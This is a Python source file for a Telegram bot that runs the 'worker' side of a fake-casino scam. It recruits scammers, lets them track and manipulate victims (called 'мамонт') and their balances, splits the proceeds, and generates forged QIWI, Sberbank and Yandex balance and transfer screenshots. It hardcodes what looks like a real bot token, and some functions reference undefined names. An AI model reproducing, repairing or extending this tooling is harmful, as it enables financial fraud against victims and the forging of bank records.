import telebot
from telebot import types
from telebot.types import InputMediaPhoto

from time import sleep

import function
from function import plural_profit, convert_date, create_phone, share_pay

import datetime, threading, database, keyboard, configparser
from datetime import timedelta

from PIL import Image, ImageFont, ImageDraw

bot = telebot.TeleBot('5974796623:AAHeZNXngEgJZ8KnfIc7m8L7m59hvmciYKE') # Токен воркер бота
db = database

config = configparser.ConfigParser()
config.read("default.ini")

# Переменные

admin = [5348342250,5890166089] # ID Админов
chat_channel = -100185041413 # ID Канала с залетами 
id_bot = 5974796623 # ID Worker бота
casino = 'blackspaysbot' # Username Casino бота
url_info_channel = 'https://t.me/leamokal' # Ссылка на инфо канал
url_payments_channel = 'https://t.me/leamokal' # Ссылка на канал залетов
date_open = 'давно' # дата открытия проекта
date_open_cc = 'давно' # дата с указанным месяцем цифрой 
url_admin = '@ektreppro' # username ТСа (можно через ',' несколько)


# Настройка INI

pay  = config['Telegram']['pay'] # Оплата простой залет
pay_support = config['Telegram']['pay_support'] # Оплата через ТП
status = config['Telegram']['messages'] # Статус работы казино (заполнять необязательно)
chat = config['Telegram']['chat'] # Ссылка на чат-приглашение
phone = config['Telegram']['phone'] # Номер QIWI
token = config['Telegram']['token'] # Токен QIWI

banned = ['Назад']

# Прохождение анкеты

user_dict = {}
class User:
    def __init__(self, infinitive):

        keys = ['url', 'experience', 'time']
        
        for key in keys:
            self.key = None

def answer_from(message):
	try:
		chat_id = message.chat.id

		user_dict[chat_id] = User(chat_id)
		user = user_dict[chat_id]
		user.url = message.text

		message = bot.send_message(chat_id, '🍀 Имеется ли у Вас <b>опыт работы</b> в данной сфере? Если да, то какой? Делали ли вы профиты и у кого работали?', parse_mode = 'html')
		bot.register_next_step_handler(message, answer_experience)

	except Exception as e:
		print(e)

def answer_experience(message):
	try:
		chat_id = message.chat.id

		user = user_dict[chat_id]
		user.experience = message.text

		message = bot.send_message(chat_id, '🍀 Сколько времени Вы <b>готовы уделять работе</b> и какого результата вы хотите добиться?', parse_mode = 'html')
		bot.register_next_step_handler(message, answer_time)

	except:
		pass

def answer_time(message):
	try:
		chat_id = message.chat.id

		user = user_dict[chat_id]
		user.time = message.text

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
		inline_1 = types.InlineKeyboardButton(text = "✅ Принять", callback_data = f'ACCEPT_{chat_id}')
		inline_2 = types.InlineKeyboardButton(text = "🚫 Отклонить", callback_data = f'CANCEL_{chat_id}')
		inline_3 = types.InlineKeyboardButton(text = "Заблокировать", callback_data = f'BAN_{chat_id}')
		inline_keyboard.add(inline_1, inline_2, inline_3)

		if message.from_user.username is not None:
			bot.send_message(admin[0], f'💌 Новая <b>заявка</b>!\n\n👨‍💻 Пользователь: @{message.from_user.username}\nОткуда узнали: {user.url}\nОпыт в работе: {user.experience}'
				+ f'\nВремя работы: {user.time}', parse_mode = 'html', reply_markup = inline_keyboard)
		else:
			bot.send_message(admin[0], f'💌 Новая <b>заявка</b>!\n\n👨‍💻 Пользователь: скрыт\nОткуда узнали: {user.url}\nОпыт в работе: {user.experience}'
				+ f'\nВремя работы: {user.time}', parse_mode = 'html', reply_markup = inline_keyboard)


		db.workers_update_thread(chat_id, 1)
		bot.send_message(chat_id, '✨ Ваша заявка была <b>отправлена</b>', parse_mode = 'html')

	except:
		pass		

# Обновление никнейма

def no_hide_nickname(message):
	try:

		if message.from_user.id != id_bot:

			if message.from_user.username is not None:
				db.workers_update_username(message.chat.id, f'@{message.from_user.username}')
			elif message.from_user.user_name is not None:
				db.workers_update_username(message.chat.id, message.from_user.user_name)

	except Exception as e:
		print(e)
	
# Вывод воркерам

def workers_receive(message, balance):
	try:
		chat_id = message.chat.id

		db.balance_to_receive(chat_id, balance)

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "✅ Выплатить", callback_data = f'RECEIVE_{chat_id}')
		inline_keyboard.add(inline_1)

		bot.send_message(admin[0], f'📨 Воркер подал заявку на <b>вывод</b>\n\nРеквизиты: <b>{message.text}</b>\nСумма вывода: <b>{balance}</b> ₽', parse_mode = 'html', reply_markup = inline_keyboard)

		receive = db.workers_receive(chat_id)
		bot.send_message(chat_id, f'📨 Заявка на <b>вывод</b> отправлена ТСу\nНа выводе: <b>{receive}</b> ₽', parse_mode = 'html')
	except Exception as e:
		raise e

# Уведомление и функции связанные с взаимодействием друого бота

def accept_receive(mamont_id):
	try:
			
		function.to_accept_receive(mamont_id)

	except Exception as e:
		print(e)

def message_to_mamont(message, mamont_id, sended_message):
	try:
		
		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)


		if (mamont_code == worker_code) or (status == 'Саппорт'):
			function.message_to_mamont(mamont_id, sended_message)
			bot.send_message(message.chat.id, 'MSG - Сообщение отправлено')
		else:
			bot.send_message(message.chat.id, '⚠️ Это <b>не ваш</b> мамонт или пользователь <b>не найден</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)

# Создание промо

def create_promo(message, promo):
	try:

		md = function.create_promo(10)
		db.promo_add(md, promo)

		bot.send_message(message.chat.id, f'Промокод <code>{md}</code> создан на сумму {promo} ₽',
			parse_mode = 'html')

	except Exception as e:
		raise e

# Воркер функции

def show_mamont_info(message, mamont_id):
	try:
		

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == 'Саппорт'):

			username = db.casino_username(mamont_id)
			balance = db.casino_balance(mamont_id)
			status = db.casino_status(mamont_id)
			workers_username = db.workers_code_to_username(mamont_code)

			bot.send_message(message.chat.id, f'💁🏻‍♀️ Информация о пользователе <b>{mamont_id}</b>\n\nПользователь: {username}\nБаланс: {balance} ₽\nСтатус: {status}\nЗаписан за: {workers_username}', parse_mode = 'html')

		else:
			bot.send_message(message.chat.id, '⚠️ Это <b>не ваш</b> мамонт или пользователь <b>не найден</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)

def set_balance(message, mamont_id, value):
	try:

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == 'Саппорт'):

			db.casino_update_balance(mamont_id, value)
			balance = db.casino_balance(mamont_id)

			bot.send_message(message.chat.id, f'Баланс установлен\nНовый баланс: <b>{balance}</b> ₽', parse_mode = 'html')
		else:
			bot.send_message(message.chat.id, '⚠️ Это <b>не ваш</b> мамонт или пользователь <b>не найден</b>',
				parse_mode = 'html')
	except Exception as e:
		print(e)

def delete_mamont(message, mamont_id):
	try:
		

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == 'Саппорт'):

			username = db.casino_username(mamont_id)
			db.casino_remove_mamont(mamont_id)

			bot.send_message(message.chat.id, f'Мамонт {mamont_id} ({username}) <b>был удален</b>', parse_mode = 'html')
		else:
			bot.send_message(message.chat.id, '⚠️ Это <b>не ваш</b> мамонт или пользователь <b>не найден</b>',
				parse_mode = 'html')


	except Exception as e:
		print(e)

def set_status(message, mamont_id, mamont_status):
	try:
		array = [1, 2, 3]

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == 'Саппорт'):

			mamont_status = int(mamont_status)
			if mamont_status in array:

				db.casino_update_status(mamont_id, mamont_status)
				mamont_status = db.casino_status(mamont_id)

				bot.send_message(message.chat.id, f'Статус установлен\nНовый Статус: <b>{mamont_status}</b>', parse_mode = 'html')

			else:
				bot.send_message(message.chat.id, '⚠️ Статус от <b>1</b> до <b>3</b>',
					parse_mode = 'html')

		else:
			bot.send_message(message.chat.id, '⚠️ Это <b>не ваш</b> мамонт или пользователь <b>не найден</b>',
				parse_mode = 'html')


	except Exception as e:
		print(e)		



# Админ функции

def payment_handler(message):
	try:
		chat_id = message.chat.id
		array = message.text.split(' ')

		db.workers_add_profit(array[0], array[1])

		share = share_pay(float(array[1]))
		code = db.workers_code(array[0])
		usernames = db.workers_code_to_username(code)


		bot.send_message(array[0], f'💞 Успешная <b>оплата</b>\nТвоя доля ~ <b>{share}</b> ₽\n\n💸 Сумма платежа: <b>{array[1]}</b> ₽', parse_mode = 'html')
		bot.send_message(chat_channel, f'💞 Успешная <b>оплата</b> (ручка)\nДоля воркера ~ <b>{share}</b> ₽\n\n👨‍💻 Воркер: {usernames}\n💸 Сумма платежа: <b>{array[1]}</b> ₽', parse_mode = 'html')
	except:
		pass


def url_chat(message):
	try:
		


		config = configparser.ConfigParser()

		config.read('default.ini')

		config['Telegram']['chat'] = message.text

		with open('default.ini', 'w') as configfile:
			config.write(configfile)

		global chat
		config.read("default.ini")
		chat = config['Telegram']['chat']

		bot.send_message(message.chat.id, 'Готово')

	except:
		pass

def set_wallet(message):
	try:
		
		array = message.text.split(':')

		config = configparser.ConfigParser()

		config.read('default.ini')

		config['Telegram']['phone'] = array[0]
		config['Telegram']['token'] = array[1]

		with open('default.ini', 'w') as configfile:
			config.write(configfile)

		global phone, token

		config.read("default.ini")
		phone = config['Telegram']['phone']
		token = config['Telegram']['token']

		bot.send_message(message.chat.id, 'Готово')

	except:
		pass


def set_status_work(message):
	try:
		


		config = configparser.ConfigParser()

		config.read('default.ini')

		config['Telegram']['messages'] = message.text

		with open('default.ini', 'w') as configfile:
			config.write(configfile)

		global status
		config.read("default.ini")
		status = config['Telegram']['messages']

		bot.send_message(message.chat.id, 'Готово')

	except:
		pass



def set_support(message):
	try:
		

		db.workers_add_support(chat_id)
		bot.send_message(message.chat.id, 'Готово')


	except:
		pass


def unset_support(message):
	try:
		

		db.workers_add_unsetsupport(chat_id)
		bot.send_message(message.chat.id, 'Готово')


	except:
		pass


def fake_qiwi_balance(message):
	try:

		if (message.text not in banned):
			text = message.text + ' ₽'
			qiwi = Image.open("Image source/Qiwi/qiwi_balance.png")
			fnt = ImageFont.truetype("Fonts/Roboto-Bold.ttf", 100)
			W = 1080
			w, h = fnt.getsize(text)
			d = ImageDraw.Draw(qiwi)
			d.text(((W - w) / 2, 296), text, font=fnt, fill=(255, 255, 255, 255))
			del d
			qiwi.save("Image cache/file_qiwi.png", "PNG")
			img = open('Image cache/file_qiwi.png', 'rb')

			bot.send_photo(message.chat.id, img)
			
		else:
			bot.send_message(message.chat.id, '👨‍💼 Вы вернулись в <b>главное меню</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())

	except Exception as e:
		print(e)

def fake_qiwi_transfer(message):
	try:

		if (message.text not in banned):
			text = message.text.split('\n')
			money = text[0] + " ₽"
			money2 = "- " + text[0].strip() + " ₽"
			phone = text[1].strip()
			date_time = text[2].strip()
			qiwi = Image.open('Image source/Qiwi/qiwi_check.png')
			font1 = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 53)
			font2 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 38)
			font3 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 45)
			font4 = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 45)
			W = 1080
			w1, h1 = font1.getsize(money2)
			w2, h2 = font1.getsize(phone)
			d = ImageDraw.Draw(qiwi)
			d.text(((W-w1)/2,685), money2, font=font1, fill=(0,0,0,255))
			d.text(((W-w2)/2 + 60,614), phone, font=font2, fill=(153,153,153,255))
			d.text((56,1890), date_time, font=font3, fill=(0,0,0,255))
			d.text((56,2072), money, font=font4, fill=(0,0,0,255))
			qiwi.save("Image cache/file_qiwi_1.png", "PNG")
			img = open('Image cache/file_qiwi_1.png', 'rb')
			bot.send_photo(message.chat.id, img)
			
		else:
			bot.send_message(message.chat.id, '👨‍💼 Вы вернулись в <b>главное меню</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())

	except Exception as e:
		print(e)	

def fake_qiwi_get_pc(message):
    try:
        if (message.text not in banned):

        	text = message.text.split('\n')

        	phone = text[0]
        	money = text[1] + ' ₽'
        	name = text[2]
        	payment = Comissions(float(text[3]) - float(text[4])).replace('.', ',')
        	comission = text[4]
        	date = text[5]
        	phone1 = phone.replace(' ', '').replace('‑', '')

        	tink = Image.open('Image source/Qiwi/qiwi_check_pc.png')
        	font1 = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 20)
        	font2 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 14)
        	font3 = ImageFont.truetype('Fonts/MuseoSans-300.ttf', 21)
        	font4 = ImageFont.truetype('Fonts/MuseoSans-300.ttf', 29)
        	font5 = ImageFont.truetype('Fonts/MuseoSans-300.ttf', 16)
        	font6 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 15)
        	font7 = ImageFont.truetype('Fonts/MuseoSans-500.ttf', 16)

        	d = ImageDraw.Draw(tink)

        	d.text((1404,20), phone, font=font2, fill=(153,153,153,255))
        	d.text((1404,40), money, font=font1, fill=(0,0,0,255))
        	d.text((497,494), name, font=font3, fill=(0,0,0,255))

        	d.text((677,553), payment, font=font5, fill=(0,0,0,255))
        	d.text((677,583), comission, font=font5, fill=(0,0,0,255))
        	d.text((677,613), payment, font=font7, fill=(0,0,0,255))
        	d.text((677,708), date, font=font5, fill=(0,0,0,255))
        	d.text((677,770), phone1, font=font5, fill=(0,0,0,255))

        	W = 1903
        	w, h = font4.getsize(payment)
        	w1, h1 = font5.getsize(payment)
        	w2, h2 = font5.getsize(comission)
        	w3, h3 = font7.getsize(payment)

        	d.text(((W - w - 810), 489), payment, font=font4, fill='#4bbd5c')
        	d.text(((677 + w1 + 7), 555), '₽', font=font6, fill='#000')
        	d.text(((677 + w2 + 7), 585), '₽', font=font6, fill='#000')
        	d.text(((677 + w3 + 7), 615), '₽', font=font6, fill='#000')

        	tink.save("Image cache/file_qiwi_check_pc.png", "PNG")
        	img = open('Image cache/file_qiwi_check_pc.png', 'rb')
        	bot.send_photo(message.chat.id, img)
        	
        else:
        	bot.send_message(message.chat.id, '👨‍💼 Вы вернулись в <b>главное меню</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())
    except Exception as e:
        print(e)

def fake_sber_balance(message):
    try:
        if (message.text not in banned):
            text = message.text.split("\n")
            time = text[0]
            name = text[1] + " ₽"
            money = text[2]
            tink = Image.open('Image source/Sber/sber_balance.png')
            font_time = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 16)
            font_name = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 24)
            font_money = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 18)
            d = ImageDraw.Draw(tink)
            d.text((15,20), time, font=font_time, fill=(225, 238, 229,255))

            if (len(text[1]) == 4):
                d.text((490,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) <= 3):
                d.text((500,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 5):
                d.text((480,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 6):
                d.text((455,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 7):
            	d.text((430,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 8):
            	d.text((400,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 9):
            	d.text((370,543), name, font=font_name, fill=(37,152,97,255))	

            d.text((115, 580), money, font=font_money, fill=(132,132,132,255))
            tink.save("Image cache/file_sber.png", "PNG")
            img = open('Image cache/file_sber.png', 'rb')
            bot.send_photo(message.chat.id, img)
            
        else:
        	bot.send_message(message.chat.id, '👨‍💼 Вы вернулись в <b>главное меню</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())
    except Exception as e:
        print(e)
def fake_yandex_balance(message):
    try:
        if (message.text not in banned):
            text = message.text.split("\n")
            time = text[0]
            name = text[1]
            money = text[2]
            tink = Image.open('Image source/Yandex/ya_balance.png')
            font_money = ImageFont.truetype('Fonts/ArialRegular.ttf', 96)
            font_name = ImageFont.truetype('Fonts/ArialRegular.ttf', 30)
            font_time = ImageFont.truetype('Fonts/Roboto-Medium.ttf', 21)
            d = ImageDraw.Draw(tink)

            d.text((330,9), time, font=font_time, fill=(255,255,255,255))
            d.text((140,90), name, font=font_name, fill=(255,255,255,255))  
            d.text((50,380), money, font=font_money, fill=(255,255,255,255))

            tink.save("Image cache/file_yandex.png", "PNG")
            img = open('Image cache/file_yandex.png', 'rb')
            bot.send_photo(message.chat.id, img)
            
        else:
            bot.send_message(message.chat.id, '👨‍💼 Вы вернулись в <b>главное меню</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())
    except Exception as e:
        print(e)		
